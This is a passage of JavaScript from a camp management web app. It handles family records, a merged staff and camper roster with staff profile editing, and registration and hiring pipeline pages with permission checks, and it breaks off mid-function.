    var h='<div class="fsec">Family Info</div>';
    h+=ff('Family Name','fmName',f.name);
    h+=ff('Notes','fmNotes',f.notes,'textarea');
    h+='<div class="fsec">Household</div>';
    var hh=f.households&&f.households[0]?f.households[0]:{label:'Primary',parents:[{name:'',phone:'',email:'',relation:''}],address:''};
    h+=ff('Household Label','fmHHLabel',hh.label);
    h+='<div class="fr">'+ff('Parent 1 Name','fmP1',hh.parents&&hh.parents[0]?hh.parents[0].name:'')+ff('Parent 1 Phone','fmP1Ph',hh.parents&&hh.parents[0]?hh.parents[0].phone:'')+'</div>';
    h+=ff('Parent 1 Email','fmP1Em',hh.parents&&hh.parents[0]?hh.parents[0].email:'','email');
    h+='<div class="fr">'+ff('Parent 2 Name','fmP2',hh.parents&&hh.parents[1]?hh.parents[1].name:'')+ff('Parent 2 Phone','fmP2Ph',hh.parents&&hh.parents[1]?hh.parents[1].phone:'')+'</div>';
    h+=ff('Address','fmAddr',hh.address);
    h+='<div class="fsec">Linked Campers</div><p style="font-size:.8rem;color:var(--s400)">Select campers in this family:</p><div id="fmCamperChecks" style="max-height:150px;overflow-y:auto;margin-top:6px">';
    // ★ Day 5: flag campers already in ANOTHER family so the user doesn't double-assign
    //   (saving will MOVE them here). Build the lookup once.
    var _assignedElsewhere={};
    Object.entries(families).forEach(function(pair){if(pair[0]===id)return;(pair[1].camperIds||[]).forEach(function(cn){_assignedElsewhere[cn]=pair[1].name||pair[0]})});
    Object.keys(roster).sort().forEach(function(n){
        var checked=(f.camperIds||[]).indexOf(n)>=0;
        var elsewhere=_assignedElsewhere[n]?' <span style="color:var(--s400);font-size:.7rem">(in '+esc(_assignedElsewhere[n])+')</span>':'';
        h+='<label style="display:flex;align-items:center;gap:6px;padding:3px 0;font-size:.8rem;cursor:pointer"><input type="checkbox" class="fmCamperCB" value="'+esc(n)+'"'+(checked?' checked':'')+' style="accent-color:var(--me)"> '+esc(n)+elsewhere+'</label>';
    });
    h+='</div>';
    document.getElementById('fmBody').innerHTML=h;
    document.getElementById('fmSave').onclick=saveFamily;
    openModal('familyModal');
}
function saveFamily(){
    var name=(document.getElementById('fmName').value||'').trim();
    if(!name){toast('Name required','error');return}
    var id=editingFam||('fam_'+Date.now());
    var camperIds=[];document.querySelectorAll('.fmCamperCB:checked').forEach(function(cb){camperIds.push(cb.value)});
    // ★ Day 5: enforce single-family membership — assigning a camper to this family
    //   removes them from any OTHER family (move semantics), so no camper is double-counted.
    Object.keys(families).forEach(function(fid){if(fid===id)return;var of=families[fid];if(of&&Array.isArray(of.camperIds))of.camperIds=of.camperIds.filter(function(cn){return camperIds.indexOf(cn)<0})});
    var p1={name:(document.getElementById('fmP1').value||'').trim(),phone:(document.getElementById('fmP1Ph').value||'').trim(),email:(document.getElementById('fmP1Em').value||'').trim(),relation:'Mother'};
    var p2={name:(document.getElementById('fmP2').value||'').trim(),phone:(document.getElementById('fmP2Ph').value||'').trim(),relation:'Father'};
    var parents=[p1];if(p2.name)parents.push(p2);
    families[id]={name:name,households:[{label:(document.getElementById('fmHHLabel').value||'Primary').trim(),parents:parents,address:(document.getElementById('fmAddr').value||'').trim(),billingContact:true}],camperIds:camperIds,balance:(families[id]&&families[id].balance)||0,totalPaid:(families[id]&&families[id].totalPaid)||0,notes:(document.getElementById('fmNotes').value||'').trim()};
    save();closeModal('familyModal');render(curPage);toast(editingFam?'Family updated':'Family added');
}
// ★ Day 5: families had no delete control (a missing/dead-control gap). Campers do NOT
//   back-reference a family, so deleting one just removes the household; the campers
//   remain (simply unassigned) — no cascade needed.
async function deleteFamily(id){
    if(!id||!families[id])return;
    var nm=families[id].name||'this family';
    var ok=await confirmDialog({title:'Delete Family?',message:'<strong>'+esc(nm)+'</strong> will be deleted. Its campers will remain in the roster but be unassigned from this family.',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    var captured=families[id];
    delete families[id];
    save();closeModal('familyModal');renderFamiliesPage();
    toast('Family deleted','ok',{actionLabel:'Undo',onAction:function(){families[id]=captured;save();renderFamiliesPage();toast('Family restored')}});
}

// Pull a single camper out of a family (the camper stays in the roster,
// just unassigned from this family). Reversible via re-detect or Edit.
function removeCamperFromFamily(familyId,camperName){
    var f=families[familyId]; if(!f)return;
    var others=(f.camperIds||[]).filter(function(c){return c!==camperName});
    f.camperIds=others;
    save();renderFamiliesPage();
    // Refresh the parent-portal Link snapshots so the removed camper actually
    // drops off this family's parent link: re-sync a remaining family member
    // (rebuilds the family's snapshot without them) and the removed camper
    // (gives them their own portal if they had an invite).
    if(typeof _syncInvitesForCamper==='function'){
        try{ if(others[0]) _syncInvitesForCamper(others[0]); _syncInvitesForCamper(camperName); }catch(_){}
    }
    toast((camperName.split(' ')[0])+' removed from '+(f.name||'family'));
}

// ── CAMPERS / PEOPLE ────────────────────────────────────────────────
// One tab holds everyone in camp — the CampMinder-style "People" area the
// old Campers / Registration / Staffing tabs used to split three ways.
// Roster = accepted into camp (enrolled campers + hired staff). Pipeline =
// still being decided (applications + staff applicants). Storage underneath
// is unchanged — roster/enrollments/staffApplications/bunkStaff/payroll.staff
// each stay the system of record their other consumers (Bunk Builder,
// Payroll, Leagues, Lite, Link, CSV import/export, the Supabase camper-limit
// trigger) already depend on; this page reads all of them and presents one
// merged view instead of forcing a separate visit to each.
function _refreshPplIfActive(){
    if(curPage==='campers')renderCampers();
    else if(curPage==='registration')renderRegistrationPage();
    else if(curPage==='hiring')renderHiringPage();
}
// Registration and Staffing used to be their own gated pages — a role could
// have me.campers without either, or me.enrollment without me.staffing (the
// Office/Registrar preset is exactly that). Merging them into one page means
// the generic per-page view/edit enforcement in campistry_access_sections.js
// can no longer tell them apart, so the Registration/Hiring panes and the
// Roster's staff rows check these sub-capabilities explicitly instead of
// relying on it.
function _pplCanEdit(section){ var S=window.CampistrySections; return S?S.canEdit(section):true; }
function _typeBadge(type){
    return type==='staff'
        ?'<span style="display:inline-flex;align-items:center;font-size:.66rem;font-weight:700;letter-spacing:.02em;padding:2px 8px;border-radius:999px;background:#EEF2FF;color:#4338CA">STAFF</span>'
        :'<span style="display:inline-flex;align-items:center;font-size:.66rem;font-weight:700;letter-spacing:.02em;padding:2px 8px;border-radius:999px;background:#ECFDF5;color:#047857">CAMPER</span>';
}
function _staffJoinKey(email,name){
    var e=String(email||'').trim().toLowerCase();
    if(e)return 'e:'+e;
    var n=String(name||'').trim().toLowerCase();
    return n?'n:'+n:'';
}
// One row per real person, merged across the three staff stores that were
// never linked to each other: hired staffApplications (bio/photo/contact),
// payroll.staff (pay + bunk assignment), bunkStaff (who's actually on which
// bunk). A camp that never used the Staffing tab has all its staff in
// payroll/bunkStaff alone — those show up here too, not just applicants who
// came through the hiring pipeline.
function buildStaffRoster(){
    var byKey={};
    function row(key){
        if(!byKey[key])byKey[key]={type:'staff',bunks:[],positions:[],_key:key};
        return byKey[key];
    }
    hiredStaff().forEach(function(a){
        var key=_staffJoinKey(a.email,a.name);
        if(!key)return;
        var r=row(key);
        r.appId=a.id;
        r.name=r.name||a.name||[a.first,a.last].filter(Boolean).join(' ');
        r.email=r.email||a.email;r.phone=r.phone||a.phone;r.photo=r.photo||a.photo;
        if((a.positions||[]).length)r.positions=a.positions;
    });
    payroll.staff.forEach(function(s){
        var key=_staffJoinKey(s.email,s.name);
        if(!key)return;
        var r=row(key);
        r.payrollId=s.id;
        r.name=r.name||s.name;
        r.email=r.email||s.email;r.phone=r.phone||s.phone;
        r.role=r.role||s.role;
        r.payType=s.payType;r.payRate=s.payRate;
        if(s.bunk&&r.bunks.indexOf(s.bunk)<0)r.bunks.push(s.bunk);
    });
    Object.keys(bunkStaff||{}).forEach(function(bunkName){
        (bunkStaff[bunkName]||[]).forEach(function(s){
            var key=_staffJoinKey(s.email,s.name);
            if(!key)return;
            var r=row(key);
            r.name=r.name||s.name;
            r.email=r.email||s.email;r.phone=r.phone||s.phone;
            r.role=r.role||s.role;
            if(r.bunks.indexOf(bunkName)<0)r.bunks.push(bunkName);
        });
    });
    return Object.keys(byKey).map(function(k){return byKey[k]}).filter(function(r){return r.name})
        .sort(function(a,b){return String(a.name).localeCompare(String(b.name))});
}
function _pplGradeForBunks(bunks){
    for(var i=0;i<bunks.length;i++){
        var loc=_bunkDivGrade(bunks[i]);
        if(loc)return loc.div+' · '+loc.gr;
    }
    return '';
}
function openPayrollStaff(id){ _prTab='staff'; nav('payroll'); prEditStaff(id); }

// Staff profile — same full-page treatment as a camper's, and for the same
// reason: "click a row, see everything" beats routing to three different
// screens depending on which of {staffApplications, payroll.staff,
// bunkStaff} happens to hold this person's record. buildStaffRoster()
// already joins those three into one row by email-or-name
// (_staffJoinKey) — this page just renders that joined view instead of
// picking ONE source and hiding the rest.
var _staffDetailKey=null;
function viewStaffMember(key){
    if(!key)return;
    _staffDetailKey=key;
    nav('staffdetail');
}
function renderStaffDetailPage(){
    var c=document.getElementById('page-staffdetail');
    if(!c)return;
    var key=_staffDetailKey;
    var row=key?buildStaffRoster().filter(function(r){return r._key===key;})[0]:null;
    if(!row){
        c.innerHTML='<div class="me-empty"><h3>Staff member not found</h3><p>They may have been removed.</p><button class="me-btn me-btn--sec" onclick="CampistryMe.nav(\'campers\')">← Back to Roster</button></div>';
        return;
    }
    function isSafeImageDataUrl(s){return typeof s==='string'&&/^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);}
    var avatarHtml=(row.photo&&isSafeImageDataUrl(row.photo))
        ?'<img src="'+row.photo+'" style="width:52px;height:52px;object-fit:cover;border-radius:8px;flex-shrink:0">'
        :av(row.name,'l');

    var h='<button class="me-btn me-btn--ghost me-btn--sm" style="margin-bottom:10px" onclick="CampistryMe.nav(\'campers\')">← Back to Roster</button>';
    h+='<div class="sec-hd"><div style="display:flex;align-items:center;gap:12px">'
        +avatarHtml
        +'<div><h2 class="sec-title">'+esc(row.name)+'</h2>'
        +'<p class="sec-desc">'+esc(row.role||(row.positions||[]).join(', ')||'Staff')+(row.bunks.length?' · '+esc(row.bunks.join(', ')):'')+'</p></div>'
        +'</div><div class="sec-actions">'
        +'<button class="me-btn me-btn--pri" onclick="CampistryMe.openEditStaffModal(\''+je(key)+'\')">Edit</button>'
        +'</div></div>';

    var g='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;align-items:start">';

    var contact=cvR('Email',row.email?'<a href="mailto:'+esc(row.email)+'" style="color:var(--me)">'+esc(row.email)+'</a>':'')
        +cvR('Phone',row.phone?'<a href="tel:'+esc(row.phone)+'" style="color:var(--me);font-weight:600">'+esc(row.phone)+'</a>':'');
    if(!row.email&&!row.phone)contact='<div style="font-size:.8rem;color:var(--s400);font-style:italic">No contact info on file</div>';
    g+=_dpCard('Contact Info',contact,{icon:'user'});

    var posBody=cvR('Role',row.role)+((row.positions||[]).length?cvR('Position(s)',esc(row.positions.join(', '))):'');
    if(row.payrollId!=null){
        var core=PC();
        var rl=(core&&(core.PAY_TYPES.filter(function(p){return p.id===row.payType})[0]||{}).rateLabel)||'Rate';
        if(row.payRate)posBody+=cvR(rl,fm(row.payRate));
        posBody+='<button class="me-btn me-btn--ghost me-btn--sm" style="margin-top:6px" onclick="CampistryMe.openPayrollStaff('+row.payrollId+')">Open in Payroll →</button>';
    }else{
        posBody+='<div style="font-size:.8rem;color:var(--s400);font-style:italic;margin-top:4px">Not on payroll yet</div>';
    }
    if(!posBody)posBody='<div style="font-size:.8rem;color:var(--s400);font-style:italic">No role on file</div>';
    g+=_dpCard('Position & Pay',posBody,{icon:'dollarSign'});

    var bunkBody=row.bunks.length?row.bunks.map(function(b){return cvR('Bunk',esc(b));}).join(''):'<div style="font-size:.8rem;color:var(--s400);font-style:italic">Not placed on a bunk yet</div>';
    g+=_dpCard('Bunk Placement',bunkBody,{icon:'mapPin'});

    if(row.appId!=null){
        var app=staffApplications[row.appId];
        var appBody=app?cvR('Status',_staffLabel(app.status||'applied')):'';
        appBody+='<button class="me-btn me-btn--ghost me-btn--sm" style="margin-top:6px" onclick="CampistryMe.viewStaffApp(\''+je(row.appId)+'\')">View Full Application →</button>';
        g+=_dpCard('Hiring Application',appBody,{icon:'fileText'});
    }

    g+='</div>';
    c.innerHTML='<div style="max-width:1400px;margin:0 auto">'+h+g+'</div>';
}
function openEditStaffModal(key){
    var row=buildStaffRoster().filter(function(r){return r._key===key;})[0];
    if(!row)return;
    var h='<div class="fg">'+ff('Name','esName',row.name||'')+'</div>'
        +'<div class="fr">'+ff('Email','esEmail',row.email||'','email')+ff('Phone','esPhone',row.phone||'','tel')+'</div>'
        +'<div class="fg">'+ff('Role','esRole',row.role||(row.positions||[]).join(', ')||'')+'</div>';
    if(row.payrollId!=null){
        var core=PC();
        h+='<div class="fr"><div class="fg"><label class="fl">Pay Type</label><select id="esPayType" class="fs">'
            +(core?core.PAY_TYPES.map(function(p){return '<option value="'+esc(p.id)+'"'+((row.payType||'hourly')===p.id?' selected':'')+'>'+esc(p.label)+'</option>';}).join(''):'')
            +'</select></div><div class="fg"><label class="fl">Rate</label><input type="number" min="0" step="0.01" id="esPayRate" class="fi" value="'+(row.payRate||'')+'"></div></div>';
    }
    showModal('Edit '+(row.name||'Staff Member'),h,function(){ saveStaffMember(key); });
}
// Writes to whichever of {payroll.staff, staffApplications} this person
// actually has a record in, THEN pushes the same identity fields onto every
// matching bunkStaff entry — the join across all three is done by
// email-or-name match at read time (_staffJoinKey), not a stored id, so a
// rename/email edit that only touched one store would silently split this
// person into two rows the next time the roster re-renders.
function saveStaffMember(key){
    var row=buildStaffRoster().filter(function(r){return r._key===key;})[0];
    if(!row)return;
    function v(id){var e=document.getElementById(id);return e?(e.value||'').trim():'';}
    var name=v('esName');
    if(!name){toast('Name is required','error');return;}
    var email=v('esEmail').toLowerCase();
    var phone=v('esPhone');
    var role=v('esRole');

    if(row.payrollId!=null){
        var idx=payroll.staff.findIndex(function(s){return String(s.id)===String(row.payrollId);});
        if(idx>=0){
            payroll.staff[idx].name=name;payroll.staff[idx].email=email;payroll.staff[idx].phone=phone;payroll.staff[idx].role=role;
            var pt=document.getElementById('esPayType');if(pt)payroll.staff[idx].payType=pt.value;
            var pr=document.getElementById('esPayRate');if(pr)payroll.staff[idx].payRate=parseFloat(pr.value)||0;
        }
    }
    if(row.appId!=null){
        var a=staffApplications[row.appId];
        if(a){a.name=name;a.email=email;a.phone=phone;}
    }
    Object.keys(bunkStaff||{}).forEach(function(bunkName){
        var touched=false;
        (bunkStaff[bunkName]||[]).forEach(function(s){
            if(_staffJoinKey(s.email,s.name)===key){
                s.name=name;s.email=email;s.phone=phone;s.role=role||s.role;
                touched=true;
            }
        });
        if(touched)_syncInvitesForBunk(bunkName);
    });

    save();
    closeModal('dynModal');
    _staffDetailKey=_staffJoinKey(email,name);
    if(curPage==='staffdetail')renderStaffDetailPage();else render(curPage);
    toast('Saved');
}
function setPplStaffSubTab(t){pplStaffSubTab=t;renderHiringPage()}
// Everyone still being decided on: applications that haven't become a camper
// yet, applicants who haven't been hired yet. The moment either happens they
// move to buildStaffRoster()/roster above and drop off here.
function buildPipelineList(){
    var out=[];
    Object.keys(enrollments).forEach(function(id){
        var e=enrollments[id];
        if(!e||e.status==='enrolled')return;
        out.push({type:'camper',id:id,name:e.camperName||'—',status:e.status||'applied',sub:e.parentName||'',appliedDate:e.appliedDate||''});
    });
    Object.keys(staffApplications).forEach(function(id){
        var a=staffApplications[id];
        if(!a||a.status==='hired')return;
        out.push({type:'staff',id:id,name:a.name||[a.first,a.last].filter(Boolean).join(' ')||'—',status:a.status||'applied',sub:(a.positions||[]).join(', '),appliedDate:a.appliedDate||''});
    });
    out.sort(function(x,y){return (y.appliedDate||'').localeCompare(x.appliedDate||'')});
    return out;
}
function _pplStatusMeta(type,status){
    if(type==='staff')return {label:_staffLabel(status),color:_staffStatusType(status)};
    var label=status?(status.charAt(0).toUpperCase()+status.slice(1)):'Applied';
    var color=status==='enrolled'||status==='accepted'?'ok':status==='waitlisted'?'warn':(status==='declined'||status==='withdrawn')?'err':'gray';
    return {label:label,color:color};
}
function _pplCamperRowActions(id,status){
    var menuId='pplRegRowMenu_'+id;
    var h='<div style="display:flex;gap:6px;justify-content:flex-end;align-items:center;white-space:nowrap">';
    if(status==='applied'){
        h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.updateEnrollStatus(\''+je(id)+'\',\'accepted\')">Accept</button>';
        h+='<div class="me-more-wrap"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe._toggleMenu(\''+menuId+'\')">⋯</button>'
            +'<div class="me-more-menu" id="'+menuId+'">'
            +'<button onclick="CampistryMe.updateEnrollStatus(\''+je(id)+'\',\'waitlisted\')">Waitlist</button>'
            +'<button onclick="CampistryMe.updateEnrollStatus(\''+je(id)+'\',\'declined\')" style="color:var(--err)">Decline</button>'
            +'</div></div>';
    }else if(status==='accepted'){
        h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.enrollCamper(\''+je(id)+'\')">'+ico('enroll')+'Enroll</button>';
        h+='<div class="me-more-wrap"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe._toggleMenu(\''+menuId+'\')">⋯</button>'
            +'<div class="me-more-menu" id="'+menuId+'">'
            +'<button onclick="CampistryMe.generateParentInvite(\''+je(id)+'\')">'+ico('invite')+'Get invite link</button>'
            +'<button onclick="CampistryMe.rescindEnrollment(\''+je(id)+'\')" style="color:var(--err)">'+ico('rescind')+'Rescind</button>'
            +'</div></div>';
    }else if(status==='waitlisted'){
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.updateEnrollStatus(\''+je(id)+'\',\'accepted\')">Accept</button>';
    }else if(status==='withdrawn'||status==='declined'){
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.updateEnrollStatus(\''+je(id)+'\',\'waitlisted\')">Re-add to waitlist</button>';
    }
    h+='</div>';
    return h;
}
function _pplStaffRowActions(id,status){
    var menuId='pplStaffRowMenu_'+id;
    var next=_staffNextStage(status);
    var h='<div style="display:flex;gap:6px;justify-content:flex-end;align-items:center">';
    if(status==='declined'){
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\'applied\',{fromRow:true})">Reconsider</button>';
    }else{
        if(next)h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\''+next+'\',{fromRow:true})">'+ico('enroll')+'Advance</button>';
        h+='<div class="me-more-wrap"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe._toggleMenu(\''+menuId+'\')">⋯</button>'
            +'<div class="me-more-menu" id="'+menuId+'">'
            +'<button onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\'declined\',{fromRow:true})" style="color:var(--err)">Decline</button>'
            +'</div></div>';
    }
    h+='</div>';
    return h;
}
// Registration and Hiring are now two separate top-level nav destinations
// instead of tabs inside one shared page — matching how camp management
// competitors (e.g. Campminder) run staff hiring as a fully separate
// applicant-tracking product from camper registration, rather than a mode
// switch inside one screen. buildPipelineList()/_pplStatusMeta()/
// _pplCamperRowActions()/_pplStaffRowActions() etc. stay shared since the
// underlying data and row actions haven't changed, only how the two
// domains are reached.
function _renderRegistrationPane(){
    var canReg=_secCan('me.enrollment');
    if(!canReg){
        return '<div class="me-empty"><h3>No access to Registration</h3><p>Your account isn\'t set up to open this section.</p></div>';
    }
    var editReg=_pplCanEdit('me.enrollment');
    var list=buildPipelineList().filter(function(r){return r.type==='camper';});

    var h='<div class="sec-hd"><div><h2 class="sec-title">Registration</h2><p class="sec-desc">'+list.length+' application'+(list.length!==1?'s':'')+' in progress</p></div>';
    h+='<div class="sec-actions">';
    if(editReg){
        h+='<div class="me-more-wrap"><button class="me-btn me-btn--teal" onclick="CampistryMe._toggleMenu(\'pplFormsMenu\')">Customize Forms ▾</button>'
            +'<div class="me-more-menu" id="pplFormsMenu" style="min-width:210px">'
            +'<button onclick="CampistryMe.openFormConfig()">Registration Form</button><button onclick="CampistryMe.openPostAcceptFormConfig()" title="Sent after a camper is accepted">Post-Acceptance Form</button>'
            +'</div></div>'
            +'<button class="me-btn me-btn--pri" onclick="CampistryMe.addApplication()">+ Manual Entry</button>';
    }
    h+='<div class="me-more-wrap"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe._toggleMenu(\'pplLinkMenu\')">🔗 Get Link</button>'
        +'<div class="me-more-menu" id="pplLinkMenu" style="min-width:250px">'
        +'<button onclick="CampistryMe.copyRegLink()">📋 Copy Link</button>'
        +'<button onclick="CampistryMe.openSendRegLinkModal()">✉ Send Link</button>'
        +'<button onclick="CampistryMe.showRegistrationQR()">▦ QR Code</button>'
        +'<div style="border-top:1px solid var(--s100);margin:4px 0"></div>'
        +'<button onclick="CampistryMe.exportEnrollmentReport()">↓ Export Applications</button>'
        +'</div></div>'
        +'</div></div>';

    if(!list.length){
        h+='<div class="me-empty"><h3>Nothing in progress</h3><p>Share your registration link, or add someone manually.</p></div>';
    }else{
        h+='<div class="me-card"><div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Detail</th><th>Applied</th><th>Status</th><th style="width:1%;white-space:nowrap"></th></tr></thead><tbody>';
        list.forEach(function(r){
            var meta=_pplStatusMeta(r.type,r.status);
            h+='<tr class="click" onclick="CampistryMe.viewApplication(\''+je(r.id)+'\')"><td class="bold">'+esc(r.name)+'</td><td style="font-size:.8rem;color:var(--s500)">'+esc(r.sub||'—')+'</td><td style="font-size:.75rem;color:var(--s400)">'+esc(r.appliedDate||'—')+'</td><td>'+bdg(meta.label,meta.color)+'</td>';
            h+='<td style="text-align:right;white-space:nowrap" onclick="event.stopPropagation()">'+(editReg?_pplCamperRowActions(r.id,r.status):'')+'</td></tr>';
        });
        h+='</tbody></table></div></div>';
    }
    return h;
}

function _renderHiringPane(){
    var canStaff=_secCan('me.staffing');
    if(!canStaff){
        return '<div class="me-empty"><h3>No access to Hiring</h3><p>Your account isn\'t set up to open this section.</p></div>';
    }
    _syncAcceptedContractsToPayroll();
    var editStaff=_pplCanEdit('me.staffing');
    var list=buildPipelineList().filter(function(r){return r.type==='staff';});
    var hiredList=hiredStaff();
    if(pplStaffSubTab!=='applicants'&&pplStaffSubTab!=='hired')pplStaffSubTab='applicants';

    var h='<div class="sec-hd"><div><h2 class="sec-title">Hiring</h2><p class="sec-desc">'+list.length+' applicant'+(list.length!==1?'s':'')+' in progress · '+hiredList.length+' hired</p></div>';
    h+='<div class="sec-actions">';
    if(editStaff){
        h+='<div class="me-more-wrap"><button class="me-btn me-btn--teal" onclick="CampistryMe._toggleMenu(\'pplFormsMenu\')">Customize Forms ▾</button>'
            +'<div class="me-more-menu" id="pplFormsMenu" style="min-width:210px">'
            +'<button onclick="CampistryMe.openStaffFormConfig()">Staff Application Form</button>'
            +'<button onclick="CampistryMe.openPostHireFormConfig()">Post-Hire Form</button>'
            +'</div></div>'
            +'<button class="me-btn me-btn--pri" onclick="CampistryMe.addStaffApp()">+ Manual Entry</button>';
    }
    h+='<div class="me-more-wrap"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe._toggleMenu(\'pplLinkMenu\')">🔗 Get Link</button>'
        +'<div class="me-more-menu" id="pplLinkMenu" style="min-width:250px">'
        +'<button onclick="CampistryMe.copyStaffLink()">📋 Copy Link</button>'
        +'<button onclick="CampistryMe.openSendStaffLinkModal()">✉ Send Link</button>'
        +'<button onclick="CampistryMe.showStaffQR()">▦ QR Code</button>'
        +'<div style="border-top:1px solid var(--s100);margin:4px 0"></div>'
        +'<button onclick="CampistryMe.exportStaffCSV()">↓ Export Applications</button>'
        +'</div></div>'
        +'</div></div>';

    h+=_visibilityPanelHTML();

    // Hired staff intentionally drop OFF the "in progress" list the moment
    // they're hired (buildPipelineList() excludes status==='hired') — this
    // Hired tab is where they land instead, so "accepted a counselor, now
    // what" has an answer inside this same page rather than only in Roster.
    h+='<div style="display:flex;gap:2px;border-bottom:1px solid var(--s200);margin-bottom:16px">';
    [{k:'applicants',l:'Applicants',c:list.length},{k:'hired',l:'Hired',c:hiredList.length}].forEach(function(s){
        var active=pplStaffSubTab===s.k;
        h+='<button onclick="CampistryMe.setPplStaffSubTab(\''+s.k+'\')" style="padding:9px 12px;border:none;background:none;font-size:.8rem;font-weight:600;cursor:pointer;white-space:nowrap;font-family:inherit;display:flex;align-items:center;gap:6px;border-bottom:2px solid '+(active?'var(--me)':'transparent')+';color:'+(active?'var(--me)':'var(--s500)')+'">'
            +esc(s.l)+'<span style="font-size:.68rem;font-weight:700;border-radius:9px;padding:1px 6px;background:'+(active?'var(--me)':'var(--s100)')+';color:'+(active?'#fff':'var(--s600)')+'">'+s.c+'</span></button>';
    });
    h+='</div>';

    if(pplStaffSubTab==='hired'){
        h+=_renderHiredStaffTable(hiredList,editStaff);
        return h;
    }

    if(!list.length){
        h+='<div class="me-empty"><h3>Nothing in progress</h3><p>Share your staff application link, or add someone manually.</p></div>';
    }else{
        h+='<div class="me-card"><div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Detail</th><th>Applied</th><th>Status</th><th style="width:1%;white-space:nowrap"></th></tr></thead><tbody>';
        list.forEach(function(r){
            var meta=_pplStatusMeta(r.type,r.status);
            h+='<tr class="click" onclick="CampistryMe.viewStaffApp(\''+je(r.id)+'\')"><td class="bold">'+esc(r.name)+'</td><td style="font-size:.8rem;color:var(--s500)">'+esc(r.sub||'—')+'</td><td style="font-size:.75rem;color:var(--s400)">'+esc(r.appliedDate||'—')+'</td><td>'+bdg(meta.label,meta.color)+'</td>';
            h+='<td style="text-align:right;white-space:nowrap" onclick="event.stopPropagation()">'+(editStaff?_pplStaffRowActions(r.id,r.status):'')+'</td></tr>';
        });
        h+='</tbody></table></div></div>';
    }
    return h;
}
// The "Hired" tab — everyone who's cleared the pipeline, formatted as an
// actual staff directory (not an applicant-review queue): position, bunk if
// placed, contact, and an inline "Assign position" action that writes
// straight back to the application record (previously read-only — see
// openAssignPositionModal). Position is what an admin most wants to set the
// moment someone's hired, well before — or entirely without — assigning a
// bunk, which the old "must place on a bunk first" flow didn't allow.
function _renderHiredStaffTable(hiredList,editStaff){
    if(!hiredList.length){
        return '<div class="me-empty"><h3>No hired staff yet</h3><p>Once you hire someone from Applicants, they\'ll show up here.</p></div>';
    }
    var h='<div class="me-card"><div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Position</th><th>Bunk</th><th>Contact</th><th style="width:1%;white-space:nowrap"></th></tr></thead><tbody>';
    hiredList.forEach(function(a){
        var bunks=bunksForStaffEmail(a.email);
        var positions=(a.positions||[]);
        h+='<tr class="click" onclick="CampistryMe.viewStaffApp(\''+je(a.id)+'\')">'
            +'<td class="bold">'+esc(a.name||[a.first,a.last].filter(Boolean).join(' ')||'—')+'</td>'
            +'<td style="font-size:.8rem;color:var(--s500)">'+(positions.length?esc(positions.join(', ')):'<span style="color:var(--s400)">Not set</span>')+'</td>'
            +'<td style="font-size:.8rem;color:var(--s500)">'+(bunks.length?esc(bunks.join(', ')):'<span style="color:var(--s400)">Unplaced</span>')+'</td>'
            +'<td style="font-size:.78rem;color:var(--s400)">'+esc(a.email||a.phone||'—')+'</td>'
            +'<td style="text-align:right;white-space:nowrap" onclick="event.stopPropagation()">'+(editStaff?'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.openAssignPositionModal(\''+je(a.id)+'\')">Assign position</button>':'')+'</td>'
            +'</tr>';
    });
    h+='</tbody></table></div></div>';
    return h;
}
// Position was previously set once, at application time, then locked —
// viewStaffApp()'s "Role & Availability" section only ever displayed it.
// This is the first place it can be changed after hire, reusing the same
// configured position list the application form itself offers (sfc.positions,
// falling back to SFC_POSITIONS_DEFAULT) so the two stay consistent.
function openAssignPositionModal(id){
    var a=staffApplications[id]; if(!a)return;
    var sfc=getStaffFormConfig();
    var options=(sfc.positions&&sfc.positions.length)?sfc.positions:SFC_POSITIONS_DEFAULT;
    var current=a.positions||[];
    var body='<p style="font-size:.8rem;color:var(--s500);margin:0 0 12px">Position for <strong>'+esc(a.name||'this staff member')+'</strong>:</p>'
        +'<div id="posModalChecks" style="display:flex;flex-direction:column;gap:6px;max-height:260px;overflow-y:auto">'
        +options.map(function(p){
            var checked=current.indexOf(p)>=0;
            return '<label style="display:flex;align-items:center;gap:8px;font-size:.85rem;cursor:pointer"><input type="checkbox" class="posModalCB" value="'+esc(p)+'"'+(checked?' checked':'')+' style="accent-color:var(--me)"> '+esc(p)+'</label>';
        }).join('')
        +'</div>';
    showModal('Assign Position',body,function(){
        var picked=[];document.querySelectorAll('.posModalCB:checked').forEach(function(cb){picked.push(cb.value)});
        a.positions=picked;
        save();
        closeModal('dynModal');
        renderHiringPage();
        toast('Position updated for '+(a.name||'staff member'));
    });
}

function renderCampers(filter){
    var c=document.getElementById('page-campers');

    // Roster — everyone accepted into camp: enrolled campers + hired staff.
    // Staff data (bio, salary, hiring status) was only ever reachable through
    // the Staffing or Payroll pages, each separately gated — showing it here
    // to anyone with plain me.campers access would leak it to roles that were
    // never granted either (Division Head, Nurse, Canteen, Bus Coordinator…).
    var canStaff=_secCan('me.staffing')||_secCan('me.payroll');
    var camperEntries=Object.entries(roster);
    var staffRows=canStaff?buildStaffRoster():[];
    if(filter){
        var q=filter.toLowerCase();
        camperEntries=camperEntries.filter(function([n,d]){var altN=[d.altFirstName,d.altLastName].filter(Boolean).join(' ').toLowerCase();return n.toLowerCase().includes(q)||altN.includes(q)||(d.division||'').toLowerCase().includes(q)||(d.bunk||'').toLowerCase().includes(q)||(d.school||'').toLowerCase().includes(q)});
